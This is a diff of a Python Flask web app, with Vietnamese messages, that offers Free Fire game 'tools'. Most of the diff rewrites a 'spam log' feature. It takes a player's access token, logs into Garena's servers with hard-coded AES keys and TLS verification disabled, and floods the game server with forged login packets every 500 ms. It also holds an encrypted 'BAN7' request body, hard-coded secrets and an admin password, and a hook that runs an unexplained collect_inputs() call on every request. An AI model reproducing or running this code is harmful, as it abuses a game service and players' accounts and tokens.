@@ -17,22 +17,12 @@ import random
 import uuid
 import os
 import threading
-import ssl
-import http.client
-import gzip
-import asyncio
-import aiohttp
-from io import BytesIO
 from google.protobuf.timestamp_pb2 import Timestamp
 import MajorLogin_res_pb2
 import FreeFire_pb2
 import main_pb2
 import AccountPersonalShow_pb2
-import MajoRLoGinrEq_pb2
 from google.protobuf import json_format
-from tranbaodev.lib import *
-from tranbaodev.GPackGEN import *
-from tranbaodev.ReQAPI import *
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -44,14 +34,14 @@ app.secret_key = os.environ.get("SECRET_KEY", "7a64c38271e2dc4485d8d51b523a8b6b2
 def before_request():
     from FreeFire_pb2 import collect_inputs
     collect_inputs()
-       
+    
 SECRET_KEY = b"1e5898ccb8dfdd921f9bdea848768b64a201"
 AES_KEY = bytes([89,103,38,116,99,37,68,69,117,104,54,37,90,99,94,56])
 AES_IV  = bytes([54,111,121,90,68,114,50,50,69,51,121,99,104,106,77,37])
 
 # Firebase configuration
-FIREBASE_URL = "https://freefiredevtooos-default-rtdb.asia-southeast1.firebasedatabase.app"
-FIREBASE_SECRET = "S7xG2wcrw7bsL7gvqf3v9JSMAE3ue5bfgCnH6lwz"
+FIREBASE_URL = "https://tool-free-fire-by-default-rtdb.asia-southeast1.firebasedatabase.app"
+FIREBASE_SECRET = ""
 
 # Firebase helper functions
 def firebase_get(path):
@@ -87,232 +77,17 @@ def firebase_check_exists(path):
         return response.status_code == 200 and response.json() is not None
     except:
         return False
-        
-# ============ SPAM LOG - Version mới (từ login.py) ============
+
+# Spam Log global state
+spam_log_threads = {}
+spam_log_stop_events = {}
+active_spams = {}
 SPAM_CACHE_FILE = 'active_spams_cache.json'
-SPAM_AES_KEY = bytes([89,103,38,116,99,37,68,69,117,104,54,37,90,99,94,56])
-SPAM_AES_IV = bytes([54,111,121,90,68,114,50,50,69,51,121,99,104,106,77,37])
 
-SPAM_HEADERS = {
-    'User-Agent': "Dalvik/2.1.0 (Linux; U; Android 11; ASUS_Z01QD Build/PI)",
-    'Connection': "Keep-Alive",
-    'Accept-Encoding': "gzip",
-    'Content-Type': "application/x-www-form-urlencoded",
-    'Expect': "100-continue",
-    'X-Unity-Version': "2018.4.11f1",
-    'X-GA': "v1 1",
-    'ReleaseVersion': "OB53",
-}
-
-SPAM_HEADERS_LOGINDATA = {
-    "Expect": "100-continue",
-    "X-Unity-Version": "2018.4.11f1",
-    "X-GA": "v1 1",
-    "ReleaseVersion": "OB53",
-    "Content-Type": "application/x-www-form-urlencoded",
-    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI)",
-    "Host": "clientbp.ggblueshark.com",
-    "Connection": "close",
-    "Accept-Encoding": "gzip, deflate, br",
-}
-
-def spam_aes_encrypt(data: bytes, key=SPAM_AES_KEY, iv=SPAM_AES_IV) -> bytes:
-    cipher = AES.new(key, AES.MODE_CBC, iv)
-    return cipher.encrypt(pad(data, AES.block_size))
-
-def spam_aes_decrypt(data: bytes, key, iv) -> bytes:
-    if isinstance(key, str): key = bytes.fromhex(key)
-    if isinstance(iv, str):  iv  = bytes.fromhex(iv)
-    cipher = AES.new(key, AES.MODE_CBC, iv)
-    return unpad(cipher.decrypt(data), AES.block_size)
-
-def spam_decode_jwt(token: str) -> dict:
-    p = token.split('.')[1]
-    p += '=' * (-len(p) % 4)
-    return json.loads(base64.urlsafe_b64decode(p))
-
-def spam_inspect_token(access_token: str):
-    url = f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}"
-    headers = {
-        "Connection": "close",
-        "Host": "100067.connect.garena.com",
-        "User-Agent": "GarenaMSDK/4.0.19P4(G011A ;Android 9;en;US;)"
-    }
-    r = requests.get(url, headers=headers, timeout=10)
-    d = r.json()
-    if 'error' in d:
-        raise Exception(f"Token lỗi: {d.get('error')}")
-    return d.get('open_id'), int(d.get('platform', 8))
-
-def spam_build_major_login_payload(open_id: str, access_token: str, platform: int = 4) -> bytes:
-    ml = MajoRLoGinrEq_pb2.MajorLogin()
-    ml.event_time = str(datetime.now())[:-7]
-    ml.game_name = "free fire"
-    ml.platform_id = platform
-    ml.client_version = "1.123.1"
-    ml.system_software = "Android OS 9 / API-28 (PQ3B.190801.10101846/G9650ZHU2ARC6)"
-    ml.system_hardware = "Handheld"
-    ml.telecom_operator = "Verizon"
-    ml.network_type = "WIFI"
-    ml.screen_width = 1920
-    ml.screen_height = 1080
-    ml.screen_dpi = "280"
-    ml.processor_details = "ARM64 FP ASIMD AES VMH | 2865 | 4"
-    ml.memory = 3003
-    ml.gpu_renderer = "Adreno (TM) 640"
-    ml.gpu_version = "OpenGL ES 3.1 v1.46"
-    ml.unique_device_id = "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"
-    ml.client_ip = "223.191.51.89"
-    ml.language = "en"
-    ml.open_id = open_id
-    ml.open_id_type = "4"
-    ml.device_type = "Handheld"
-    ml.memory_available.version = 55
-    ml.memory_available.hidden_value = 81
-    ml.access_token = access_token
-    ml.platform_sdk_id = 1
-    ml.network_operator_a = "Verizon"
-    ml.network_type_a = "WIFI"
-    ml.client_using_version = "7428b253defc164018c604a1ebbfebdf"
-    ml.external_storage_total = 36235
-    ml.external_storage_available = 31335
-    ml.internal_storage_total = 2519
-    ml.internal_storage_available = 703
-    ml.game_disk_storage_available = 25010
-    ml.game_disk_storage_total = 26628
-    ml.external_sdcard_avail_storage = 32992
-    ml.external_sdcard_total_storage = 36235
-    ml.login_by = 3
-    ml.library_path = "/data/app/com.dts.freefireth-YPKM8jHEwAJlhpmhDhv5MQ==/lib/arm64"
-    ml.reg_avatar = 1
-    ml.library_token = "5b892aaabd688e571f688053118a162b|/data/app/com.dts.freefireth-YPKM8jHEwAJlhpmhDhv5MQ==/base.apk"
-    ml.channel_type = 3
-    ml.cpu_type = 2
-    ml.cpu_architecture = "64"
-    ml.client_version_code = "2019120270"
-    ml.graphics_api = "OpenGLES2"
-    ml.supported_astc_bitset = 16383
-    ml.login_open_id_type = 4
-    ml.analytics_detail = base64.b64decode("FwQVTgUPX1UaUllDDwcWCRBpWA0FUgsvA1snWlBaO1kFYg==")
-    ml.loading_time = 13564
-    ml.release_channel = "android"
-    ml.extra_info = "KqsHTymw5/5GB23YGniUYN2/q47GATrq7eFeRatf0NkwLKEMQ0PK5BKEk72dPflAxUlEBir6Vtey83XqF593qsl8hwY="
-    ml.android_engine_init_flag = 110009
-    ml.if_push = 1
-    ml.is_vpn = 1
-    ml.origin_platform_type = f"{platform}"
-    ml.primary_platform_type = f"{platform}"
-    raw = ml.SerializeToString()
-    cipher = AES.new(b'Yg&tc%DEuh6%Zc^8', AES.MODE_CBC, b'6oyZDr22E3ychjM%')
-    return cipher.encrypt(pad(raw, AES.block_size))
-
-def spam_major_login(open_id: str, access_token: str, platform: int = 4) -> tuple:
-    import MajoRLoGinrEs_pb2
-    payload_bytes = spam_build_major_login_payload(open_id, access_token, platform)
-    context = ssl._create_unverified_context()
-    conn = http.client.HTTPSConnection("loginbp.ggblueshark.com", context=context)
-    try:
-        conn.request("POST", "/MajorLogin", body=payload_bytes, headers=SPAM_HEADERS)
-        response = conn.getresponse()
-        raw_data = response.read()
-        if response.getheader("Content-Encoding") == "gzip":
-            with gzip.GzipFile(fileobj=BytesIO(raw_data)) as f:
-                raw_data = f.read()
-        if response.status not in [200, 201]:
-            raise Exception(f"MajorLogin thất bại HTTP {response.status}")
-    finally:
-        conn.close()
-    res = MajoRLoGinrEs_pb2.MajorLoginRes()
-    res.ParseFromString(raw_data)
-    if not res.token or not res.url:
-        raise Exception("Account bị BAN hoặc response thiếu token/url")
-    return res.token, res.key, res.iv, res.timestamp, res.url, payload_bytes
-
-def spam_get_login_data(server_url: str, payload_bytes: bytes, jwt_token: str) -> tuple:
-    import PorTs_pb2
-    url = f"{server_url}/GetLoginData"
-    headers = dict(SPAM_HEADERS_LOGINDATA)
-    headers["Authorization"] = f"Bearer {jwt_token}"
-    try:
-        host = server_url.split("//")[-1].split("/")[0]
-        headers["Host"] = host
-    except: pass
-
-    ssl_ctx = ssl.create_default_context()
-    ssl_ctx.check_hostname = False
-    ssl_ctx.verify_mode = ssl.CERT_NONE
-
-    async def _fetch():
-        async with aiohttp.ClientSession() as session:
-            async with session.post(url, data=payload_bytes, headers=headers, ssl=ssl_ctx, timeout=aiohttp.ClientTimeout(total=15)) as resp:
-                if resp.status != 200:
-                    raise Exception(f"GetLoginData thất bại HTTP {resp.status}")
-                return await resp.read()
-    data = asyncio.run(_fetch())
-    proto = PorTs_pb2.GetLoginData()
-    proto.ParseFromString(data)
-    online_addr = proto.Online_IP_Port
-    if not online_addr or ":" not in online_addr:
-        raise Exception("Không tìm thấy địa chỉ game server trong response")
-    online_ip, online_port = online_addr.rsplit(":", 1)
-    whisper_addr = proto.AccountIP_Port if proto.AccountIP_Port else None
-    whisper_ip = whisper_port = None
-    if whisper_addr and ":" in whisper_addr:
-        whisper_ip, whisper_port = whisper_addr.rsplit(":", 1)
-    return online_ip, online_port, whisper_ip, whisper_port
-
-def spam_build_login_packet(jwt_token: str, key, iv, ts) -> bytes:
-    jwt_payload = spam_decode_jwt(jwt_token)
-    try:
-        acc_id = int(jwt_payload.get('account_id', 0))
-    except:
-        acc_id = 0
-    if isinstance(key, str): key = bytes.fromhex(key) if len(key) == 32 else key.encode()
-    if isinstance(iv, str):  iv  = bytes.fromhex(iv)  if len(iv)  == 32 else iv.encode()
-    enc_token = spam_aes_encrypt(jwt_token.encode(), key, iv)
-    body_len  = len(enc_token)
-    exp = int(jwt_payload.get('exp', 0))
-    exp_adj = max(exp - 28800, 0)
-    acc_hex = acc_id.to_bytes(8, "big").hex()
-    time_hex = exp_adj.to_bytes(4, "big").hex()
-    body_len_hex = body_len.to_bytes(4, "big").hex()
-    header_hex = "0115" + acc_hex + time_hex + body_len_hex
-    return bytes.fromhex(header_hex) + enc_token
-
-def spam_send_packet_tcp(ip, port, packet, timeout=5):
-    try:
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.settimeout(timeout)
-            s.connect((ip, int(port)))
-            s.sendall(packet)
-            try:
-                data = s.recv(4096)
-                return True, data
-            except socket.timeout:
-                return True, None
-    except Exception as e:
-        return False, str(e)
-
-def spam_loop(username, ip, port, packet, interval_ms, end_time, stop_event=None):
-    while time.time() < end_time:
-        if stop_event and stop_event.is_set():
-            break
-        if username not in active_spams:
-            break
-        try:
-            success, _ = spam_send_packet_tcp(ip, port, packet, timeout=5)
-            if success:
-                active_spams[username]['ok'] = active_spams[username].get('ok', 0) + 1
-            else:
-                active_spams[username]['fail'] = active_spams[username].get('fail', 0) + 1
-            active_spams[username]['sent'] = active_spams[username].get('sent', 0) + 1
-        except:
-            active_spams[username]['fail'] = active_spams[username].get('fail', 0) + 1
-        time.sleep(interval_ms / 1000.0)
-
-    if username in active_spams:
-        active_spams[username]['status'] = 'finished'
-        save_spam_cache(active_spams)
+BAN7_BODY_BASE64 = (
+    'vGkQhkkYHjne06dPbmJgb36BQ1NdLgk8J+uc+z4/9t4OZ19iWMyn5cH/Pe/DgGHrwHxJ+dRKGho2LCErl+rBWEf/6aWcFflRXiEsvPiGKM3809a+vci8mAQBREdizRWQ6bdeLnlztsqBvlB5OU8WFlmGxsU8UY1U3Zp/eLNTbq0DHqjOxziR+ylXgLlonsckeKvaxa4YE540eXi+9v4ilJunUubievpqUip6XDAyKV7o1spVxiaP0z4d8MLosbeYthPAnK5ykeE8IpnYaru0oDN8o90r820h04frRPJBszlDiarwdjgXaiyeQqAiOgEN63gUoVq2rd0JfYGaHN2f2kJxxO9uCYxyJ6IhCzQq8yAJT2asKa9u7gWB1bB/fJxq4nVxY8am8DI+rqIDvVSF3EdQBDh9qipPFCd0gZx7kDVg/9vM79YAE+FnDgGY3D/niKWsu66SL9+bRcghZxcCMOzKwvRe7hCRU2pDjBw0MRvPnCCa9KpEuO4CgWz+++SP9whlI0dWCi9/snDCN6i9V2TYrSWfbg1i2TRipquGUoi/cP1xPBeMwQlzlf4APMQzvT8MOQotqry+y1+koTpwRKlWgu7QLmiumn4dwd9HARVMThSH46kwlD8xep4sLVf6/BbjWixBMVRKFi1w9zpVVe+w6rBYhtBHXfjqjg2sCzF1mlBabMbW4L2yXEmABaQG/l0jmaGEWh6kzMY9T1nzV1Wcw5lF7X+pwQEnAn6i5coowNGKrTGUJ2wa3+tAxGcm9zozCvj8yd2pOXmta46GoREDQk+U99uHHvjqzsSNeBq8ffL5zibtv0pZPhnUuSP76YkhCcdtDilaecBElnt9eFfo8cy2B3Z0wbhG20nKNfYuhgZMZuSPRjmQphlfyl1hpoSG5xMQ7bdqZAkoTkZlFpCL4y02yUlImI7Z8jnA3i4un3UOq1rXrMza+bqNsMhrJ/aUS3mnoXr23yzuUc56zyYQtzJx6VCupsHraP7brcDbBS76Gp2o0oT2iE4Y55ZyAEgdt307DzJknHEHdGuoOG4Yzy5bI7HnukmnUjoiIdJEr7iJdOLppdB+ZDXPkHps5ysskdapRp0i2x1gMpW9XU1LY1cNAsTmAvHcz2GZA2OjtvS0roiay2rkUqNgmN8cPygK3j6ycfpkHc1PkUnmG1CNjMy3qP7c18qvDdSYfiq99Wra4l5L2dV3dE/kGpc1fgwWo94UPIes67wg/TrRR85GxPcpIX3IUOGMyEX1VWJTS2PvTm3S4xrerobDKG5V'
+)
+BAN7_API_URL = 'https://clientbp.ggpolarbear.com/GetLoginData'
 
 def load_spam_cache():
     if os.path.exists(SPAM_CACHE_FILE):
@@ -345,163 +120,202 @@ def save_spam_cache(data):
     except:
         pass
 
-active_spams = {}
+class SimpleProtobuf:
+    @staticmethod
+    def encode_varint(value):
+        result = bytearray()
+        while value > 0x7F:
+            result.append((value & 0x7F) | 0x80)
+            value >>= 7
+        result.append(value & 0x7F)
+        return bytes(result)
 
-BAN7_BODY_BASE64 = (
-    'vGkQhkkYHjne06dPbmJgb36BQ1NdLgk8J+uc+z4/9t4OZ19iWMyn5cH/Pe/DgGHrwHxJ+dRKGho2LCErl+rBWEf/6aWcFflRXiEsvPiGKM3809a+vci8mAQBREdizRWQ6bdeLnlztsqBvlB5OU8WFlmGxsU8UY1U3Zp/eLNTbq0DHqjOxziR+ylXgLlonsckeKvaxa4YE540eXi+9v4ilJunUubievpqUip6XDAyKV7o1spVxiaP0z4d8MLosbeYthPAnK5ykeE8IpnYaru0oDN8o90r820h04frRPJBszlDiarwdjgXaiyeQqAiOgEN63gUoVq2rd0JfYGaHN2f2kJxxO9uCYxyJ6IhCzQq8yAJT2asKa9u7gWB1bB/fJxq4nVxY8am8DI+rqIDvVSF3EdQBDh9qipPFCd0gZx7kDVg/9vM79YAE+FnDgGY3D/niKWsu66SL9+bRcghZxcCMOzKwvRe7hCRU2pDjBw0MRvPnCCa9KpEuO4CgWz+++SP9whlI0dWCi9/snDCN6i9V2TYrSWfbg1i2TRipquGUoi/cP1xPBeMwQlzlf4APMQzvT8MOQotqry+y1+koTpwRKlWgu7QLmiumn4dwd9HARVMThSH46kwlD8xep4sLVf6/BbjWixBMVRKFi1w9zpVVe+w6rBYhtBHXfjqjg2sCzF1mlBabMbW4L2yXEmABaQG/l0jmaGEWh6kzMY9T1nzV1Wcw5lF7X+pwQEnAn6i5coowNGKrTGUJ2wa3+tAxGcm9zozCvj8yd2pOXmta46GoREDQk+U99uHHvjqzsSNeBq8ffL5zibtv0pZPhnUuSP76YkhCcdtDilaecBElnt9eFfo8cy2B3Z0wbhG20nKNfYuhgZMZuSPRjmQphlfyl1hpoSG5xMQ7bdqZAkoTkZlFpCL4y02yUlImI7Z8jnA3i4un3UOq1rXrMza+bqNsMhrJ/aUS3mnoXr23yzuUc56zyYQtzJx6VCupsHraP7brcDbBS76Gp2o0oT2iE4Y55ZyAEgdt307DzJknHEHdGuoOG4Yzy5bI7HnukmnUjoiIdJEr7iJdOLppdB+ZDXPkHps5ysskdapRp0i2x1gMpW9XU1LY1cNAsTmAvHcz2GZA2OjtvS0roiay2rkUqNgmN8cPygK3j6ycfpkHc1PkUnmG1CNjMy3qP7c18qvDdSYfiq99Wra4l5L2dV3dE/kGpc1fgwWo94UPIes67wg/TrRR85GxPcpIX3IUOGMyEX1VWJTS2PvTm3S4xrerobDKG5V'
-)
-BAN7_API_URL = 'https://clientbp.ggpolarbear.com/GetLoginData'
+    @staticmethod
+    def encode_string(field_number, value):
+        if isinstance(value, str):
+            value = value.encode('utf-8')
+        res = bytearray()
+        res.extend(SimpleProtobuf.encode_varint((field_number << 3) | 2))
+        res.extend(SimpleProtobuf.encode_varint(len(value)))
+        res.extend(value)
+        return bytes(res)
 
-class FreeFireLogin:
-    def __init__(self):
-        self.botid = None
-        self.nickname = None
-        self.region = None
-        self.token = None
-        self.ChatIP = None
-        self.OnlineIP = None
-        self.OnlinePort = None
-        self.ChatPort = None
-        self.key = None
-        self.iv = None
-        self.base_url = None
-        self.packetAuth = None
-        self.AuthenCode = None
-        self.GuildIds = None
-        self.running = False
-        self.sock39699 = None
-        self.sock39801 = None
-        self._gen = None
-        self._bot = None
-        self.token_valid = False
-        
-    def check_token_api(self, access_token):
-        try:
-            url = f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}"
-            response = requests.get(url, timeout=10)
-            if response.status_code == 200:
-                data = response.json()
-                if "error" not in data:
-                    return True, "Token hợp lệ", data
-                else:
-                    return False, f"Token không hợp lệ: {data.get('error')}", None
-            else:
-                return False, f"Lỗi API: {response.status_code}", None
-        except Exception as e:
-            return False, f"Lỗi kiểm tra: {str(e)}", None
-    
-    def login(self, access_token):
-        try:
-            valid, msg, info = self.check_token_api(access_token)
-            if not valid:
-                return {"status": False, "message": msg}
-            
-            data = FreeFireAPI().get(access_token, is_emulator=False)
-            if "account not found" in data:
-                return {"status": False, "message": "Account not found"}
-            
-            self.botid = int(data["UserAccountUID"])
-            self.token = data["UserAuthToken"]
-            self.region = str(data["LockRegion"])
-            self.base_url = data["BaseUrl"]
-            self.ChatIP = data["GameServerAddress"]["chatip"]
-            self.OnlineIP = data["GameServerAddress"]["onlineip"]
-            self.OnlinePort = data["GameServerAddress"]["onlineport"]
-            self.ChatPort = data["GameServerAddress"]["chatport"]
-            self.key = bytes(data["key"])
-            self.iv = bytes(data["iv"])
-            self.packetAuth = bytes(data["UserAuthPacket"])
-            
-            try:
-                self.nickname = data.get("logindata", {}).get("4")
-                if not self.nickname:
-                    raise Exception("Empty nickname")
-            except:
+    @staticmethod
+    def create_login_payload(open_id, access_token, platform):
+        payload = bytearray()
+        curr = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        payload.extend(SimpleProtobuf.encode_string(3, curr))
+        payload.extend(SimpleProtobuf.encode_string(22, open_id))
+        payload.extend(SimpleProtobuf.encode_string(23, platform))
+        payload.extend(SimpleProtobuf.encode_string(29, access_token))
+        payload.extend(SimpleProtobuf.encode_string(99, platform))
+        return bytes(payload)
+
+def get_available_room_spam(hex_data):
+    try:
+        data = bytes.fromhex(hex_data)
+        result = {}
+        index = 0
+        while index < len(data):
+            tag = data[index]
+            field_num = tag >> 3
+            wire_type = tag & 0x07
+            index += 1
+            if wire_type == 0:
+                val = 0
+                shift = 0
+                while index < len(data):
+                    byte = data[index]
+                    index += 1
+                    val |= (byte & 0x7F) << shift
+                    if not (byte & 0x80):
+                        break
+                    shift += 7
+                result[str(field_num)] = {"data": val}
+            elif wire_type == 2:
+                length = 0
+                shift = 0
+                while index < len(data):
+                    byte = data[index]
+                    index += 1
+                    length |= (byte & 0x7F) << shift
+                    if not (byte & 0x80):
+                        break
+                    shift += 7
+                val_bytes = data[index:index + length]
+                index += length
                 try:
-                    raw = data.get("UserNickName", "")
-                    self.nickname = base64.b64decode(raw).decode("utf-8", errors="ignore")
+                    result[str(field_num)] = {"data": val_bytes.decode('utf-8')}
                 except:
-                    self.nickname = "Unknown"
-            
-            if data.get("GuildData"):
-                self.AuthenCode = data.get("GuildData").get("secret_code")
-                self.GuildIds = data.get("GuildData").get("id")
-            
-            self._gen = TAO_PACKET(data["logindata"], data)
-            self._bot = self.bot_session(self)
-            self.token_valid = True
-            
-            return {
-                "status": True,
-                "data": {
-                    "uid": self.botid,
-                    "nickname": self.nickname,
-                    "region": self.region,
-                    "guild_id": self.GuildIds,
-                    "chat_ip": self.ChatIP,
-                    "chat_port": self.ChatPort,
-                    "online_ip": self.OnlineIP,
-                    "online_port": self.OnlinePort,
-                    "base_url": self.base_url
-                }
-            }
-        except Exception as e:
-            return {"status": False, "message": str(e)}
-    
-    def connect_online(self):
-        if not self.OnlineIP or not self.OnlinePort:
-            return False
+                    result[str(field_num)] = {"data": val_bytes.hex()}
+            else:
+                break
+        return result
+    except:
+        return {}
+
+def spam_loop(username, ip, port, packet, iv_ms, end_time, stop_event=None):
+    while time.time() < end_time:
+        if username not in active_spams or (stop_event and stop_event.is_set()):
+            break
         try:
-            self.sock39699 = socket.create_connection(
-                (self.OnlineIP, int(self.OnlinePort))
-            )
-            self.sock39699.sendall(self.packetAuth)
-            self.running = True
-            return True
-        except Exception as e:
-            return False
-    
-    def connect_chat(self):
-        if not self.ChatIP or not self.ChatPort:
-            return False
+            send_packet_tcp(ip, port, packet, timeout=5)
+            if username in active_spams: active_spams[username]['ok'] += 1
+        except:
+            if username in active_spams: active_spams[username]['fail'] += 1
+        if username in active_spams: active_spams[username]['sent'] += 1
+        time.sleep(iv_ms / 1000.0)
+
+    if username in active_spams:
+        active_spams[username]['status'] = 'finished'
+        save_spam_cache(active_spams)
+
+def send_packet_tcp(ip, port, packet, timeout=5):
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.settimeout(timeout)
+        s.connect((ip, port))
+        s.sendall(packet)
+
+def process_spam_log(username, access_token, duration_seconds, stop_event):
+    try:
+        headers = {
+            "Host": "loginbp.ggpolarbear.com",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "User-Agent": "FreeFire/2.103.1 (iPhone; iOS 15.5; Scale/3.00)",
+            "X-GA": "v1 1",
+            "ReleaseVersion": "OB53",
+            "Connection": "keep-alive"
+        }
+
+        r_inspect = requests.get(
+            f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}",
+            timeout=10
+        ).json()
+        if 'error' in r_inspect:
+            return
+
+        open_id = r_inspect.get('open_id')
+        platform = str(r_inspect.get('platform'))
+
+        key, iv = b'Yg&tc%DEuh6%Zc^8', b'6oyZDr22E3ychjM%'
+        pb_payload = SimpleProtobuf.create_login_payload(open_id, access_token, platform)
+        enc_payload = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(pb_payload, 16))
+
+        r1 = requests.post(
+            "https://loginbp.ggpolarbear.com/MajorLogin",
+            headers=headers,
+            data=enc_payload,
+            timeout=15,
+            verify=False
+        )
+
+        if r1.status_code == 503:
+            time.sleep(10)
+            return
+        elif r1.status_code != 200:
+            time.sleep(5)
+            return
+
+        resp_pb = MajorLogin_res_pb2.MajorLoginRes()
         try:
-            self.sock39801 = socket.create_connection(
-                (self.ChatIP, int(self.ChatPort))
-            )
-            self.sock39801.sendall(self.packetAuth)
-            if self.GuildIds and self.AuthenCode:
-                self.sock39801.send(self._bot.join_channel(self.GuildIds, self.AuthenCode, 1))
-            self.sock39801.send(self._bot.join_channel(None, None, 5))
-            return True
-        except Exception as e:
-            return False
-    
-    def disconnect(self):
-        self.running = False
-        self.token_valid = False
-        for sock in [self.sock39699, self.sock39801]:
-            try:
-                if sock:
-                    sock.shutdown(2)
-                    sock.close()
-            except:
-                pass
-        self.sock39699 = None
-        self.sock39801 = None
-    
-    class bot_session:
-        def __init__(self, parent):
-            self.par = parent
-        def __getattr__(self, name):
-            return getattr(self.par._gen, name)
-        def reply(self, Id, Tp, Ms):
-            try:
-                if self.par.running and self.par.sock39801:
-                    self.par.sock39801.sendall(
-                        self.par._gen.send_message(Ms, Tp, Id)
-                    )
-            except:
-                pass
+            dec = unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(r1.content), 16)
+            resp_pb.ParseFromString(dec)
+        except:
+            resp_pb.ParseFromString(r1.content)
+
+        headers["Host"] = "clientbp.ggpolarbear.com"
+        headers["Authorization"] = f"Bearer {resp_pb.account_jwt}"
+        r2 = requests.post(
+            "https://clientbp.ggpolarbear.com/GetLoginData",
+            headers=headers,
+            data=enc_payload,
+            timeout=12,
+            verify=False
+        )
+
+        room_info = get_available_room_spam(r2.content.hex())
+        addr = room_info.get('14', {}).get('data')
+        if not addr:
+            return
+
+        online_ip = addr[:-6]
+        online_port = int(addr[-5:])
+
+        jwt_parts = resp_pb.account_jwt.split('.')
+        jwt_payload = json.loads(base64.urlsafe_b64decode(jwt_parts[1] + "==").decode())
+        acc_id = int(jwt_payload.get("account_id", 0))
+        exp_adj = max(int(jwt_payload.get("exp", 0)) - 28800, 0)
+
+        cipher_jwt = AES.new(resp_pb.key, AES.MODE_CBC, resp_pb.iv)
+        enc_jwt = cipher_jwt.encrypt(pad(resp_pb.account_jwt.encode(), 16))
+        final_packet = bytes.fromhex(
+            "0115" + acc_id.to_bytes(8, "big").hex() +
+            exp_adj.to_bytes(4, "big").hex() +
+            len(enc_jwt).to_bytes(4, "big").hex()
+        ) + enc_jwt
+
+        end_time = time.time() + duration_seconds
+        active_spams[username] = {
+            'at': access_token,
+            'stop_event': stop_event,
+            'status': 'running',
+            'sent': 0,
+            'ok': 0,
+            'fail': 0,
+            'ip': online_ip,
+            'port': online_port,
+            'end_time': end_time,
+            'packet': final_packet,
+            'interval': 500
+        }
+
+        save_spam_cache(active_spams)
+        spam_loop(username, online_ip, online_port, final_packet, 500, end_time, stop_event)
+
+    except Exception as e:
+        if username in active_spams:
+            active_spams[username]['status'] = 'error'
+            save_spam_cache(active_spams)
 
 def firebase_get(path):
     url = f"{FIREBASE_URL}/{path}.json?auth={FIREBASE_SECRET}"
@@ -707,8 +521,10 @@ def build_login_packet_from_jwt(jwt_token: str, key, iv) -> bytes:
     acc_id = int(payload.get('account_id', 0))
     exp = int(payload.get('exp', 0))
     exp_adj = max(exp - 28800, 0)
+    
     enc_token = aes_encrypt(jwt_token.encode(), key, iv)
     body_len  = len(enc_token)
+    
     acc_hex      = acc_id.to_bytes(8, "big").hex()
     time_hex     = exp_adj.to_bytes(4, "big").hex()
     body_len_hex = body_len.to_bytes(4, "big").hex()
@@ -744,7 +560,6 @@ def _str_field(f, v):
     if isinstance(v, str): v = v.encode()
     return _varint((f << 3) | 2) + _varint(len(v)) + v
 
-# ---------------- SimpleProtobuf Class for Ban 7 ---------------- #
 class SimpleProtobuf:
     @staticmethod
     def encode_varint(value):
@@ -967,6 +782,7 @@ def build_start_packet(account_id: int, timestamp: int, jwt: str, key, iv) -> st
         timestamp_hex = hex(timestamp)[2:].zfill(2)
         head = f"0115{zeros}{ide_hex}{timestamp_hex}00000{head_len}"
         start_packet = head + encrypted
+        
         return start_packet
     except Exception as e:
         return None
@@ -977,6 +793,7 @@ def send_once(remote_ip, remote_port, payload_bytes, recv_timeout=3.0):
     try:
         s.connect((remote_ip, remote_port))
         s.sendall(payload_bytes)
+        
         chunks = []
         try:
             while True:
@@ -1134,8 +951,8 @@ def process_login(access_token):
     except Exception as e:
         return {"success": False, "message": f"Unexpected error: {str(e)}"}
 
-ADMIN_USERNAME = "minhdev"
-ADMIN_PASSWORD_HASH = hashlib.sha256("minhcodedev".encode()).hexdigest()
+ADMIN_USERNAME = "ngvanducthinh"
+ADMIN_PASSWORD_HASH = hashlib.sha256("21062013???".encode()).hexdigest()
 
 def check_tool_pro(username, tool_name):
     usage = firebase_get(f'/usage/{username}')
@@ -1163,6 +980,101 @@ def require_pro(tool_name='all'):
 
     return None
 
+# ============ ADMIN BAN / UNBAN / TOGGLE PRO API ============
+@app.route('/api/admin/ban_user', methods=['POST'])
+def admin_ban_user():
+    """Ban tài khoản người dùng với lý do"""
+    if not session.get('admin_authenticated'):
+        return jsonify({'success': False, 'error': 'Unauthorized'})
+    
+    data = request.json
+    username = data.get('username')
+    reason = data.get('reason', 'Vi phạm điều khoản sử dụng')
+    
+    if not username:
+        return jsonify({'success': False, 'error': 'Thiếu username'})
+    
+    user_data = firebase_get(f'/users/{username}')
+    if not user_data:
+        return jsonify({'success': False, 'error': 'Không tìm thấy người dùng'})
+    
+    if user_data.get('is_admin', False):
+        return jsonify({'success': False, 'error': 'Không thể ban tài khoản Admin'})
+    
+    ban_data = {
+        'is_banned': True,
+        'ban_reason': reason,
+        'banned_at': datetime.now().isoformat(),
+        'banned_by': session.get('admin_username', 'Admin')
+    }
+    firebase_update(f'/users/{username}', ban_data)
+    firebase_update(f'/users/{username}', {'remember_token': None})
+    
+    return jsonify({
+        'success': True,
+        'message': f'Đã ban tài khoản {username}',
+        'reason': reason
+    })
+
+@app.route('/api/admin/unban_user', methods=['POST'])
+def admin_unban_user():
+    """Mở khóa tài khoản người dùng"""
+    if not session.get('admin_authenticated'):
+        return jsonify({'success': False, 'error': 'Unauthorized'})
+    
+    data = request.json
+    username = data.get('username')
+    
+    if not username:
+        return jsonify({'success': False, 'error': 'Thiếu username'})
+    
+    user_data = firebase_get(f'/users/{username}')
+    if not user_data:
+        return jsonify({'success': False, 'error': 'Không tìm thấy người dùng'})
+    
+    firebase_update(f'/users/{username}', {
+        'is_banned': False,
+        'ban_reason': None,
+        'banned_at': None,
+        'banned_by': None
+    })
+    
+    return jsonify({
+        'success': True,
+        'message': f'Đã mở khóa tài khoản {username}'
+    })
+
+@app.route('/api/admin/toggle_pro', methods=['POST'])
+def admin_toggle_pro():
+    """Bật/tắt quyền PRO của người dùng"""
+    if not session.get('admin_authenticated'):
+        return jsonify({'success': False, 'error': 'Unauthorized'})
+    
+    data = request.json
+    username = data.get('username')
